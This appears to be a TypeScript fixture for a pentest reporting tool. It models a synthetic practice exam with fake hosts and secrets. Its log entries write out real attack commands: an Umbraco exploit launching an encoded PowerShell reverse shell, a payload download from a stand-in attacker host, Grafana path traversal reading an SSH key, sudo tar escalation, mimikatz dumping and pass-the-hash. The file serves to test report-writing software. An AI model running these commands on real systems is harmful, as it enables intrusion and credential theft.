// The mock exam (e-exam) as a real exam run reads: three standalone machines (ms01 and web01 rooted, lnx02 never
// started) and an AD set of three (ad02 entered with the provided credentials; app03 reached with an autologon password
// found on ad02, which no finding covers; dc01 taken with a cached Domain Admin hash). The report holds one appendix
// page and one free page the owner wrote.
// Realistic commands and output, screenshots rendered from the same text (src/audit/images/shots.mjs), a modified
// public exploit with its original, failed attempts of every public kind, and private items that must never reach
// the report. Synthetic throughout: invented 10.10.30.x targets, the RFC 5737 attacker 192.0.2.10, made-up secrets.
import type { AccessGrant, Credential, Username } from "../types/credentials";
import type { ChecklistItem } from "../types/checklist";
import type { CleanupItem } from "../types/cleanup";
import type { FailedAttempt, Finding, FindingFile } from "../types/findings";
import type { CommandBlock, LogEntry } from "../types/log";
import type { Hop } from "../types/network";
import type { Note, RuledOut } from "../types/notes";
import type { Report, ReportSection } from "../types/report";
import { DRAFT_LAYOUT, type ReportData } from "../engines/report/types";
import type { Engagement } from "../types/engagement";
import type { Host } from "../types/host";
import type { Service } from "../types/service";
import { DA_NTLM, FLAGS, GARNET, OUTPUT, PROOF, REVERSE_SHELL_B64 } from "./examTexts";
import layout5Web01 from "../test/fixtures/report-layout5-web01.json" with { type: "json" };

const E = "e-exam";
const MS01 = "h-exam-ms01";
const WEB = "h-exam-web";
const LNX = "h-exam-lnx";
const AD02 = "h-exam-ad02";
const DC01 = "h-exam-dc01";
const APP03 = "h-exam-app03";

/** The exam's entries are placed by minutes before `now`. */
export function examFixtures(now: number) {
  const ago = (min: number) => now - min * 60_000;

  // ------------------------------------------------------------ log

  const log: LogEntry[] = [];
  const add = (id: string, min: number, over: Partial<LogEntry> & Pick<LogEntry, "kind" | "title" | "content" | "hostIds">) => {
    const at = ago(min);
    const e: LogEntry = {
      id: `l-exam-${id}`, engagementId: E, titleEdited: false, ranOn: "Kali (VM)", observations: null, returnedNothing: false,
      private: false, at, createdAt: at, updatedAt: at, ...over,
    };
    log.push(e);
    return e.id;
  };
  const cmd = (id: string, min: number, title: string, hostIds: string[], blocks: CommandBlock[], over: Partial<LogEntry> = {}) =>
    add(id, min, { kind: "command", title, hostIds, content: { kind: "command", blocks }, ...over });
  const shot = (id: string, min: number, key: string, caption: string, hostIds: string[]) =>
    add(id, min, { kind: "screenshot", title: caption, hostIds, content: { kind: "screenshot", attachmentId: `a-${key}`, caption, fileName: `${key}.png` } });
  const flag = (id: string, min: number, host: string, hostId: string, kind: "local" | "proof", value: string, proof: string, key: string) =>
    add(id, min, {
      kind: "flag", title: `${kind}.txt · ${host}`, hostIds: [hostId], ranOn: host,
      content: { kind: "flag", flagKind: kind, value, attachmentId: `a-${key}`, proof },
    });

  add("start", 180, { kind: "note", title: "Exam started", hostIds: [], content: { kind: "note", text: "Timebox running. Metasploit reserved for ms01 only." } });

  // ms01: Umbraco 7.12.4 authenticated RCE (EDB 46153, modified) for a foothold, PrintSpoofer for SYSTEM.
  const ms01Nmap = cmd("ms01-nmap", 172, "Full TCP scan of ms01", [MS01], [{ command: "nmap -p- -sC -sV --min-rate 3000 -oN scans/ms01.nmap 10.10.30.5", output: MS01_NMAP }]);
  const smb = cmd("ms01-smb", 166, "Anonymous SMB share listing on ms01", [MS01], [{ command: "smbclient -N -L //10.10.30.5", output: "session setup failed: NT_STATUS_ACCESS_DENIED" }], { returnedNothing: true });
  const hydra = cmd("ms01-hydra", 162, "Guess the MSSQL sa password", [MS01], [{
    command: "hydra -l sa -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -t 4 mssql://10.10.30.5",
    output: [
      "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - for legal purposes only",
      "[DATA] max 4 tasks per 1 server, overall 4 tasks, 10000 login tries (l:1/p:10000), ~2500 tries per task",
      "[DATA] attacking mssql://10.10.30.5:1433/",
      "[STATUS] 812.00 tries/min, 812 tries in 00:01h, 9188 to do in 00:12h, 4 active",
      "1 of 1 target completed, 0 valid password found",
    ].join("\n"),
  }]);
  const ferox = cmd("ms01-ferox", 155, "Web content discovery on ms01", [MS01], [
    { command: "feroxbuster -u http://10.10.30.5 -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x txt,aspx -t 50", output: MS01_FEROX },
    { command: "curl -s http://10.10.30.5/umbraco/ | grep -o '\"version\":\"[0-9.]*\"'", output: '"version":"7.12.4"' },
  ]);
  shot("ms01-login", 153, "ms01-umbraco", "Umbraco 7.12.4 back-office login on ms01", [MS01]);
  const notesTxt = cmd("ms01-notes", 150, "Admin credentials in /backup/notes.txt", [MS01], [{
    command: "curl -s http://10.10.30.5/backup/notes.txt",
    output: [
      "Go-live checklist (intranet)",
      "- move the site to Umbraco 7.12.4                 done",
      "- back-office admin: admin@exam.corp / Spring2026!",
      "- TODO: rotate the admin password after launch",
      "- TODO: remove this folder from IIS",
    ].join("\n"),
  }]);
  const rce = cmd("ms01-rce", 142, "Umbraco RCE to a reverse shell on ms01", [MS01], [
    {
      command: `python3 46153.py -u admin@exam.corp -p 'Spring2026!' -i http://10.10.30.5 -c powershell.exe -a "-nop -w hidden -e ${REVERSE_SHELL_B64}"`,
      output: [
        "[+] Logging in to http://10.10.30.5/umbraco as admin@exam.corp",
        "[+] Login OK, back-office session cookie set",
        "[+] Sending the XSLT payload to /umbraco/developer/Xslt/xsltVisualize.aspx",
        "[+] Payload accepted (HTTP 200): powershell.exe started on the target",
      ].join("\n"),
    },
    { command: "rlwrap nc -lvnp 443", output: OUTPUT.ms01Shell },
  ]);
  shot("ms01-shell", 140, "ms01-shell", "Reverse shell on ms01 as the IIS app pool", [MS01]);
  flag("ms01-local", 137, "ms01", MS01, "local", FLAGS.ms01Local, PROOF.ms01Local, "ms01-local");
  const privs = cmd("ms01-privs", 132, "Token privileges of the app pool", [MS01], [{ command: "whoami /priv", output: MS01_PRIVS, shell: "powershell" }], { ranOn: "ms01" });
  const winpeas = cmd("ms01-winpeas", 127, "winPEAS on ms01", [MS01], [{ command: ".\\winPEASx64.exe quiet systeminfo userinfo servicesinfo", output: winPeasOutput(), shell: "powershell" }], { ranOn: "ms01" });
  const privateCmd = cmd("ms01-private", 122, "Reused a password from my lab notes", [MS01], [{ command: "nxc mssql 10.10.30.5 -u sa -p 'Lab-Notes-Pass1!' --local-auth", output: "MSSQL  10.10.30.5  1433  MS01  [-] MS01\\sa:Lab-Notes-Pass1! Login failed for user 'sa'." }], { private: true });
  const x86 = cmd("ms01-x86", 118, "PrintSpoofer (32-bit build) on ms01", [MS01], [{ command: "C:\\Windows\\Tasks\\PrintSpoofer32.exe -i -c powershell.exe", output: "[-] This version of PrintSpoofer is not compatible with the version of Windows you're running.", shell: "powershell" }], { ranOn: "ms01" });
  const spoofer = cmd("ms01-spoofer", 114, "PrintSpoofer to SYSTEM on ms01", [MS01], [
    // A transfer that prints nothing is still a step: the run below it shows the result.
    { command: "iwr http://192.0.2.10/PrintSpoofer64.exe -OutFile C:\\Windows\\Tasks\\PrintSpoofer64.exe", output: "", shell: "powershell" },
    { command: "C:\\Windows\\Tasks\\PrintSpoofer64.exe -i -c powershell.exe", output: OUTPUT.ms01System, shell: "powershell" },
  ], { ranOn: "ms01" });
  shot("ms01-system", 112, "ms01-system", "SYSTEM shell on ms01 through PrintSpoofer", [MS01]);
  flag("ms01-proof", 110, "ms01", MS01, "proof", FLAGS.ms01Proof, PROOF.ms01Proof, "ms01-proof");

  // web01: Grafana 8.3.0 path traversal (CVE-2021-43798) reads dev's SSH key; sudo tar to root.
  const webNmap = cmd("web01-nmap", 105, "Full TCP scan of web01", [WEB], [{ command: "nmap -p- -sC -sV --min-rate 3000 -oN scans/web01.nmap 10.10.30.20", output: WEB01_NMAP }]);
  cmd("web01-gobuster", 100, "Directory brute force on web01 port 80", [WEB], [{
    command: "gobuster dir -u http://10.10.30.20 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 40",
    output: "/.htaccess            (Status: 403) [Size: 277]\n/index.html           (Status: 200) [Size: 10918]\n/server-status        (Status: 403) [Size: 277]",
  }]);
  const grafana = cmd("web01-grafana", 96, "Grafana version on web01 port 3000", [WEB], [{ command: "curl -s http://10.10.30.20:3000/login | grep -o 'Grafana v[0-9.]*'", output: "Grafana v8.3.0" }]);
  const passwd = cmd("web01-passwd", 93, "Path traversal reads /etc/passwd on web01", [WEB], [{
    command: "curl --path-as-is http://10.10.30.20:3000/public/plugins/alertlist/../../../../../../../../etc/passwd",
    output: [
      "root:x:0:0:root:/root:/bin/bash",
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
      "sshd:x:110:65534::/run/sshd:/usr/sbin/nologin",
      "dev:x:1000:1000:dev,,,:/home/dev:/bin/bash",
      "grafana:x:113:118::/usr/share/grafana:/bin/false",
    ].join("\n"),
  }]);
  const key = cmd("web01-key", 90, "Path traversal reads dev's SSH key", [WEB], [{
    command: "curl -s --path-as-is http://10.10.30.20:3000/public/plugins/alertlist/../../../../../../../../home/dev/.ssh/id_rsa -o dev_id_rsa && head -3 dev_id_rsa",
    output: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAs2N0aGV0aWMta2V5LWZvci1hbi1hdWRpdC1maXh0dXJlLW9ubHkA",
  }]);
  const ssh = cmd("web01-ssh", 87, "SSH to web01 as dev with the key", [WEB], [{
    command: "chmod 600 dev_id_rsa && ssh -i dev_id_rsa dev@10.10.30.20",
    output: "Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)\n\nLast login: Tue Nov  3 09:14:52 2026 from 10.10.30.254\ndev@web01:~$ id\nuid=1000(dev) gid=1000(dev) groups=1000(dev)",
  }]);
  flag("web01-local", 85, "web01", WEB, "local", FLAGS.web01Local, PROOF.web01Local, "web01-local");
  const sudo = cmd("web01-sudo", 82, "sudo rights of dev", [WEB], [{
    command: "sudo -l", shell: "dev@web01",
    output: "Matching Defaults entries for dev on web01:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser dev may run the following commands on web01:\n    (root) NOPASSWD: /usr/bin/tar",
  }], { ranOn: "web01" });
  const tar = cmd("web01-tar", 79, "Root shell through sudo tar", [WEB], [{
    command: "sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash", shell: "dev@web01",
    output: "/usr/bin/tar: Removing leading `/' from member names\nroot@web01:/home/dev# id\nuid=0(root) gid=0(root) groups=0(root)",
  }], { ranOn: "web01" });
  flag("web01-proof", 77, "web01", WEB, "proof", FLAGS.web01Proof, PROOF.web01Proof, "web01-proof");

  // AD set: the provided j.ellis credentials on ad02, a deployment script's local admin, a cached Domain Admin hash.
  const kerberoast = cmd("ad-kerberoast", 74, "Kerberoast exam.corp with the provided account", [AD02, DC01], [{
    command: "impacket-GetUserSPNs exam.corp/j.ellis:'Welcome2026!' -dc-ip 10.10.30.10 -request -outputfile kerb.hash && hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
    output: "ServicePrincipalName           Name     MemberOf  PasswordLastSet\n-----------------------------  -------  --------  -------------------\nMSSQLSvc/ad02.exam.corp:1433   svc_sql            2026-09-14 08:12:40\n\nStatus...........: Exhausted\nRecovered........: 0/1 (0.00%) Digests",
  }]);
  const adNmap = cmd("ad02-nmap", 72, "Full TCP scan of ad02", [AD02], [{ command: "nmap -p- -sC -sV --min-rate 3000 -oN scans/ad02.nmap 10.10.30.11", output: AD02_NMAP }]);
  const dcNmap = cmd("dc01-nmap", 70, "Full TCP scan of dc01", [DC01], [{ command: "nmap -p- -sV --min-rate 3000 -oN scans/dc01.nmap 10.10.30.10", output: DC01_NMAP }]);
  const winrm = cmd("ad02-winrm", 62, "WinRM to ad02 with the provided credentials", [AD02], [
    {
      command: "nxc winrm 10.10.30.11 -u j.ellis -p 'Welcome2026!'",
      output: "WINRM       10.10.30.11     5985   AD02             [*] Windows 10 / Server 2019 Build 17763 (name:AD02) (domain:exam.corp)\nWINRM       10.10.30.11     5985   AD02             [+] exam.corp\\j.ellis:Welcome2026! (Pwn3d!)",
    },
    { command: "evil-winrm -i 10.10.30.11 -u j.ellis -p 'Welcome2026!'", output: OUTPUT.ad02Winrm },
  ]);
  shot("ad02-winrm-shot", 60, "ad02-winrm", "WinRM session on ad02 as j.ellis", [AD02]);
  const deploy = cmd("ad02-deploy", 55, "Deployment script with svc_deploy's password", [AD02], [{
    command: "type C:\\Scripts\\deploy.ps1", shell: "evil-winrm",
    output: "# Nightly package deploy to the app servers\n$user = 'exam\\svc_deploy'\n$pass = ConvertTo-SecureString 'D3ploy!2026' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential($user, $pass)\nInvoke-Command -ComputerName ad02 -Credential $cred -ScriptBlock { & C:\\Deploy\\run.ps1 }",
  }], { ranOn: "ad02" });
  const admin = cmd("ad02-admin", 50, "svc_deploy is a local administrator on ad02", [AD02], [
    { command: "evil-winrm -i 10.10.30.11 -u svc_deploy -p 'D3ploy!2026'", output: "Evil-WinRM shell v3.5\n\nInfo: Establishing connection to remote endpoint" },
    { command: 'whoami /groups | findstr /i "Administrators"', shell: "evil-winrm", output: "BUILTIN\\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner" },
  ]);
  // An autologon password on ad02 that gets onto app03: a credential that moved, with no finding of its own.
  cmd("ad02-winlogon", 49, "Autologon password in the Winlogon key on ad02", [AD02], [{
    command: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword', shell: "evil-winrm",
    output: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n    DefaultUserName    REG_SZ    m.ross\n    DefaultPassword    REG_SZ    Kiosk#Logon26",
  }], { ranOn: "ad02" });
  const appNmap = cmd("app03-nmap", 48, "Full TCP scan of app03", [APP03], [{ command: "nmap -p- -sV --min-rate 3000 -oN scans/app03.nmap 10.10.30.12", output: APP03_NMAP }]);
  const appWinrm = cmd("app03-winrm", 47, "WinRM to app03 as m.ross", [APP03], [
    {
      command: "nxc winrm 10.10.30.12 -u m.ross -p 'Kiosk#Logon26'",
      output: "WINRM       10.10.30.12     5985   APP03            [*] Windows 10 / Server 2019 Build 17763 (name:APP03) (domain:exam.corp)\nWINRM       10.10.30.12     5985   APP03            [+] exam.corp\\m.ross:Kiosk#Logon26 (Pwn3d!)",
    },
    { command: "evil-winrm -i 10.10.30.12 -u m.ross -p 'Kiosk#Logon26'", output: "Evil-WinRM shell v3.5\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\m.ross\\Documents> whoami\nexam\\m.ross" },
  ]);
  const mimikatz = cmd("ad02-mimikatz", 46, "Cached Domain Admin logon on ad02", [AD02], [{
    command: '.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"', shell: "evil-winrm",
    output: MIMIKATZ,
  }], { ranOn: "ad02" });
  flag("ad02-proof", 44, "ad02", AD02, "proof", FLAGS.ad02Proof, PROOF.ad02Proof, "ad02-proof");
  const psexec = cmd("dc01-psexec", 38, "Pass the hash to dc01 as da_admin", [DC01], [{
    command: `impacket-psexec exam.corp/da_admin@10.10.30.10 -hashes :${DA_NTLM}`,
    output: PSEXEC,
  }]);
  flag("dc01-proof", 35, "dc01", DC01, "proof", FLAGS.dc01Proof, PROOF.dc01Proof, "dc01-proof");

  // ------------------------------------------------------------ hosts' services

  let sN = 0;
  const svc = (hostId: string, port: number, nmapService: string | null, nmapVersion: string | null, over: Partial<Service> = {}): Service => ({
    id: `s-exam-${++sN}`, hostId, port, protocol: "tcp", state: "open", nmapService, nmapVersion, confirmedProduct: null, confirmedVersion: null,
    confirmedEntryId: null, verdict: null, createdAt: ago(172), updatedAt: ago(172), ...over,
  });
  const services: Service[] = [
    svc(MS01, 80, "http", "Microsoft IIS httpd 10.0", { confirmedProduct: "Umbraco CMS", confirmedVersion: "7.12.4", confirmedEntryId: ferox }),
    svc(MS01, 135, "msrpc", "Microsoft Windows RPC"),
    svc(MS01, 139, "netbios-ssn", "Microsoft Windows netbios-ssn"),
    svc(MS01, 445, "microsoft-ds?", null),
    svc(MS01, 1433, "ms-sql-s", "Microsoft SQL Server 2019 15.00.2000.00"),
    svc(MS01, 5985, "http", "Microsoft HTTPAPI httpd 2.0"),
    svc(WEB, 22, "ssh", "OpenSSH 8.2p1 Ubuntu 4ubuntu0.11"),
    svc(WEB, 80, "http", "Apache httpd 2.4.41", { confirmedProduct: "Apache httpd", confirmedVersion: "2.4.41" }),
    svc(WEB, 3000, "ppp?", null, { confirmedProduct: "Grafana", confirmedVersion: "8.3.0", confirmedEntryId: grafana }),
    svc(LNX, 22, "ssh", "OpenSSH 7.6p1"),
    svc(LNX, 8080, "http", "Jetty 9.4.z-SNAPSHOT"),
    svc(AD02, 135, "msrpc", "Microsoft Windows RPC"),
    svc(AD02, 445, "microsoft-ds?", null),
    svc(AD02, 3389, "ms-wbt-server", "Microsoft Terminal Services"),
    svc(AD02, 5985, "http", "Microsoft HTTPAPI httpd 2.0"),
    svc(APP03, 135, "msrpc", "Microsoft Windows RPC"),
    svc(APP03, 445, "microsoft-ds?", null),
    svc(APP03, 5985, "http", "Microsoft HTTPAPI httpd 2.0"),
    svc(DC01, 53, "domain", "Simple DNS Plus"),
    svc(DC01, 88, "kerberos-sec", "Microsoft Windows Kerberos"),
    svc(DC01, 389, "ldap", "Microsoft Windows Active Directory LDAP (Domain: exam.corp)"),
    svc(DC01, 445, "microsoft-ds?", null),
    svc(DC01, 5985, "http", "Microsoft HTTPAPI httpd 2.0"),
  ];
  const port = (hostId: string, p: number) => services.find((s) => s.hostId === hostId && s.port === p)!.id;

  // ------------------------------------------------------------ findings, exploit file

  const finding = (id: string, over: Partial<Finding> & Pick<Finding, "title" | "hostIds" | "stepEntryIds">): Finding => ({
    id: `f-exam-${id}`, engagementId: E, severity: "high", cvssVector: null, cvssScore: null, status: "confirmed", description: "", impact: "",
    remediation: "", exploitNotes: "", lessons: "", refs: [], serviceIds: [], createdAt: ago(30), updatedAt: ago(30), ...over,
  });
  const findings: Finding[] = [
    finding("umbraco", {
      title: "Authenticated remote code execution in Umbraco CMS 7.12.4", severity: "critical",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", cvssScore: 9.9, hostIds: [MS01], serviceIds: [port(MS01, 80)],
      stepEntryIds: [notesTxt, rce],
      description: "The Umbraco back office's XSLT visualiser compiles inline C# from the submitted stylesheet. Any back-office user can run commands as the IIS app pool. The admin password was published in /backup/notes.txt on the same site.",
      impact: "Command execution on ms01 as the IIS app pool, the start of full control of the host.",
      remediation: "Upgrade Umbraco to a supported release.\nRemove /backup from the site and rotate the admin password.\nRestrict /umbraco to the admin network.",
      lessons: "Read every file feroxbuster finds before brute forcing anything.",
      refs: ["https://www.exploit-db.com/exploits/46153"],
    }),
    finding("printspoofer", {
      title: "SeImpersonatePrivilege abuse to SYSTEM on ms01", hostIds: [MS01], stepEntryIds: [privs, spoofer],
      description: "The IIS app pool holds SeImpersonatePrivilege, so it can impersonate a SYSTEM token caught through the print spooler's named pipe.",
      impact: "Full control of ms01 as NT AUTHORITY\\SYSTEM.",
      remediation: "Run the site under an account without SeImpersonatePrivilege where the platform allows.\nDisable the Print Spooler service on servers that do not print.",
      refs: ["https://github.com/itm4n/PrintSpoofer"],
    }),
    finding("grafana", {
      title: "Unauthenticated path traversal in Grafana 8.3.0 (CVE-2021-43798)", cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      cvssScore: 7.5, hostIds: [WEB], serviceIds: [port(WEB, 3000)], stepEntryIds: [passwd, key, ssh],
      description: "The plugin asset route of Grafana 8.0.0 to 8.3.0 does not normalise the path, so any file the grafana user can read is served without logging in. dev's private SSH key was readable.",
      impact: "Any readable file on web01, including the SSH key that logs in as dev.",
      remediation: "Upgrade Grafana to 8.3.1 or later.\nKeep SSH private keys readable by their owner only.",
      refs: ["https://nvd.nist.gov/vuln/detail/CVE-2021-43798", "https://www.exploit-db.com/exploits/50581"],
    }),
    finding("tar", {
      title: "Passwordless sudo on tar gives root on web01", hostIds: [WEB], stepEntryIds: [sudo, tar],
      description: "dev may run /usr/bin/tar as root without a password. tar's --checkpoint-action runs any command.",
      impact: "Full control of web01 as root.", remediation: "Remove the sudo rule, or replace it with a wrapper script that takes no arguments.",
      refs: ["https://gtfobins.github.io/gtfobins/tar/"],
    }),
    // Owner-shaped findings (2026-11-12): text pasted straight from a terminal, unfenced, as the owner really writes them.
    finding("grafana-repo", {
      title: "Datasource password in the Grafana provisioning repo", hostIds: [WEB], serviceIds: [port(WEB, 3000)], stepEntryIds: [],
      description: [
        "The web root serves `/.git/`. Its history holds the database password that a later commit removed:",
        "",
        "commit 4be1d9c07a52e3f86d10b2c4e7f9a0315d6c8e22 Author: Site Admin <admin@exam.lab> Date:   Fri Nov 18 17:22:48 2022 +0200",
        "",
        "    Add the reporting datasource",
        "",
        "diff --git a/datasources/mysql.yaml b/datasources/mysql.yaml",
        "--- a/datasources/mysql.yaml",
        "+++ b/datasources/mysql.yaml",
        "@@ -4,7 +4,7 @@ class Database{",
        "-    private $username = \"dev@exam.lab\";",
        "-    private $password = \"CopperKite71\";",
        "+    private $username = \"\";",
        "+    private $password = \"\";",
        "     public function getConnection() {",
        "         $this->conn = null;",
        "         try{",
        "             $this->conn = new PDO(\"mysql:host=\" . $this->host . \";dbname=\" . $this->db_name, $this->username, $this->password);",
        "             $this->conn->exec(\"set names utf8\");",
        "         }catch(PDOException $exception){",
        "             echo \"Connection error: \" . $exception->getMessage();",
        "         }",
        "         return $this->conn;",
        "     }",
        "+} +?>",
        "",
        "Affected: http-git (port 80)",
      ].join("\n"),
      remediation: "env vars, .gitignore, secrets managers, pre-commit hooks like gitleaks. Once a secret has been pushed to remote, it's burned and must be rotated. Scrub repo history.",
    }),
    finding("joomla-upload", {
      title: "Joomla 4.2.4 — Malicious File Upload", hostIds: [WEB], stepEntryIds: [],
      cvssVector: "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", cvssScore: 8.8,
      description: "Inadequate checks in the Media Manager allowed users with \"edit\" privileges to change file extension to arbitrary extension, including .php and other potentially executable extensions.",
    }),
    finding("ssh-password", {
      title: "SSH password authentication enabled", hostIds: [WEB], stepEntryIds: [],
      description: "`PasswordAuthentication` unset in `sshd_config` and drop-ins, so the OpenSSH default (`yes`) applies; any leaked/guessed password yields a remote shell.",
      remediation: "Fix config to only allow ssh w/ id_rsa",
    }),
    finding("joomla-installation", {
      title: "Joomla `installation/` directory left in webroot", severity: "low", hostIds: [WEB], stepEntryIds: [],
      description: "post-install cleanup skipped (Joomla mandates deleting it). The install SQL under `cms/installation/sql/` is world-readable and holds a **planted LDAP bind cred** `admin/bobby7` (`cred #7`) in the `plg_authentication_ldap` default params; stock ships these empty.",
      remediation: "Never skip post-install cleanup of defaults and placeholder files",
    }),
    finding("joomla-readable", {
      title: "Live Joomla install world-readable by low-priv user", severity: "medium", hostIds: [WEB], stepEntryIds: [],
      description: "the full `/var/www/html/cms/` tree is root-owned but mode `755/644`, so `dev` can read the live `configuration.php` with the DB password.",
      remediation: "chmod 640 configuration.php, owner www-data.",
    }),
    finding("deploy", {
      title: "Local administrator password in a deployment script on ad02", hostIds: [AD02], stepEntryIds: [deploy, admin],
      description: "C:\\Scripts\\deploy.ps1 is readable by every domain user and holds svc_deploy's password in clear text. svc_deploy is a local administrator on ad02.",
      impact: "Local administrator on ad02.", remediation: "Use a group-managed service account for the deployment.\nRestrict C:\\Scripts to administrators and rotate svc_deploy's password.",
    }),
    finding("cached-da", {
      title: "Domain Admin credentials cached on a member server", severity: "critical", hostIds: [AD02, DC01], stepEntryIds: [mimikatz, psexec],
      description: "da_admin had an interactive session on ad02, so its NTLM hash was in LSASS memory. Passing that hash to dc01 gave a SYSTEM shell on the domain controller.",
      impact: "Full control of the exam.corp domain.",
      remediation: "Use Domain Admin accounts on domain controllers only (tiered administration).\nAdd privileged accounts to Protected Users and enable LSA protection on member servers.",
      refs: ["https://attack.mitre.org/techniques/T1550/002/"],
    }),
  ];
  const findingFiles: FindingFile[] = [
    {
      id: "ff-exam-46153", findingId: "f-exam-umbraco", name: "46153.py", language: "python", content: EXPLOIT_MODIFIED, modified: true,
      originalUrl: "https://www.exploit-db.com/exploits/46153", originalContent: EXPLOIT_ORIGINAL, createdAt: ago(30), updatedAt: ago(30),
    },
  ];

  // ------------------------------------------------------------ attempts, ruled out (public and private)

  const attempt = (id: string, over: Partial<FailedAttempt> & Pick<FailedAttempt, "title" | "reasonKind" | "reason">): FailedAttempt => ({
    id: `fa-exam-${id}`, engagementId: E, hostId: null, findingId: null, private: over.reasonKind === "operator", logEntryId: null,
    createdAt: ago(60), updatedAt: ago(60), ...over,
  });
  const failedAttempts: FailedAttempt[] = [
    attempt("smb", { hostId: MS01, title: "Null session share listing on 445/tcp", reasonKind: "control", reason: "Anonymous access is refused (NT_STATUS_ACCESS_DENIED).", logEntryId: smb }),
    attempt("hydra", { hostId: MS01, title: "Password guessing for sa on 1433/tcp", reasonKind: "precondition", reason: "No common password matched; the account needs a password from somewhere else.", logEntryId: hydra }),
    // The owner's own slip: private by design, never in the report.
    attempt("x86", { hostId: MS01, title: "Ran the 32-bit PrintSpoofer build", reasonKind: "operator", reason: "Picked the wrong binary for a 64-bit host.", logEntryId: x86 }),
    attempt("kerberoast", { title: "Kerberoasting svc_sql", reasonKind: "precondition", reason: "The ticket did not crack with rockyou.txt.", logEntryId: kerberoast }),
  ];
  const ruledOut: RuledOut[] = [
    { id: "r-exam-rpc", engagementId: E, hostId: MS01, text: "135/tcp and 139/tcp RPC and NetBIOS", reason: "Null sessions are refused; nothing beyond the default endpoints.", private: false, sourceKind: null, sourceId: null, createdAt: ago(160) },
    { id: "r-exam-winrm", engagementId: E, hostId: MS01, text: "5985/tcp WinRM", reason: "No credentials for a Remote Management user.", private: false, sourceKind: null, sourceId: null, createdAt: ago(158) },
    { id: "r-exam-theory", engagementId: E, hostId: MS01, text: "The sa password is the Umbraco one", reason: "Hunch only.", private: true, sourceKind: null, sourceId: null, createdAt: ago(140) },
    { id: "r-exam-apache", engagementId: E, hostId: WEB, text: "80/tcp Apache 2.4.41", reason: "Only the Ubuntu default page; no application behind it.", private: false, sourceKind: null, sourceId: null, createdAt: ago(99) },
    { id: "r-exam-asrep", engagementId: E, hostId: null, text: "AS-REP roasting exam.corp", reason: "No account has Kerberos pre-authentication disabled.", private: false, sourceKind: null, sourceId: null, createdAt: ago(73) },
  ];

  // ------------------------------------------------------------ access, hops, credentials

  const usernames: Username[] = [
    { id: "u-exam-apppool", engagementId: E, username: "defaultapppool", domain: "iis apppool", sourceHostId: MS01, source: "reverse shell", createdAt: ago(142), scope: "unknown", localHostId: null },
    { id: "u-exam-system", engagementId: E, username: "system", domain: "nt authority", sourceHostId: null, source: null, createdAt: ago(114), scope: "unknown", localHostId: null },
    { id: "u-exam-dev", engagementId: E, username: "dev", domain: null, sourceHostId: WEB, source: "/etc/passwd", createdAt: ago(93), scope: "unknown", localHostId: null },
    { id: "u-exam-root", engagementId: E, username: "root", domain: null, sourceHostId: WEB, source: null, createdAt: ago(79), scope: "unknown", localHostId: null },
    { id: "u-exam-jellis", engagementId: E, username: "j.ellis", domain: "EXAM", sourceHostId: null, source: "provided by the exam", createdAt: ago(180), scope: "unknown", localHostId: null },
    { id: "u-exam-deploy", engagementId: E, username: "svc_deploy", domain: "EXAM", sourceHostId: AD02, source: "deploy.ps1", createdAt: ago(55), scope: "unknown", localHostId: null },
    { id: "u-exam-mross", engagementId: E, username: "m.ross", domain: "EXAM", sourceHostId: AD02, source: "Winlogon autologon", createdAt: ago(49), scope: "unknown", localHostId: null },
    { id: "u-exam-da", engagementId: E, username: "da_admin", domain: "EXAM", sourceHostId: AD02, source: "mimikatz on ad02", createdAt: ago(46), scope: "unknown", localHostId: null },
  ];
  const grant = (id: string, usernameId: string, hostId: string, level: AccessGrant["level"], via: string, logEntryId: string, min: number): AccessGrant => ({
    id: `ag-exam-${id}`, engagementId: E, usernameId, hostId, level, via, logEntryId, at: ago(min),
  });
  const accessGrants: AccessGrant[] = [
    grant("ms01-user", "u-exam-apppool", MS01, "user", "Umbraco XSLT RCE", rce, 142),
    grant("ms01-system", "u-exam-system", MS01, "system", "PrintSpoofer", spoofer, 114),
    grant("web01-user", "u-exam-dev", WEB, "user", "SSH with dev's key", ssh, 87),
    grant("web01-root", "u-exam-root", WEB, "system", "sudo tar", tar, 79),
    grant("ad02-user", "u-exam-jellis", AD02, "user", "Provided credentials over WinRM", winrm, 62),
    grant("ad02-admin", "u-exam-deploy", AD02, "admin", "svc_deploy password from deploy.ps1", admin, 50),
    grant("app03-user", "u-exam-mross", APP03, "user", "WinRM as m.ross", appWinrm, 47),
    grant("dc01-system", "u-exam-da", DC01, "system", "Pass the hash as da_admin (psexec)", psexec, 38),
  ];
  const hops: Hop[] = [
    { id: "hp-exam-1", engagementId: E, fromHostId: null, toHostId: AD02, via: "Provided credentials for j.ellis over WinRM", logEntryId: winrm, at: ago(62), updatedAt: ago(62) },
    { id: "hp-exam-3", engagementId: E, fromHostId: AD02, toHostId: APP03, via: "WinRM as m.ross", logEntryId: appWinrm, at: ago(47), updatedAt: ago(47) },
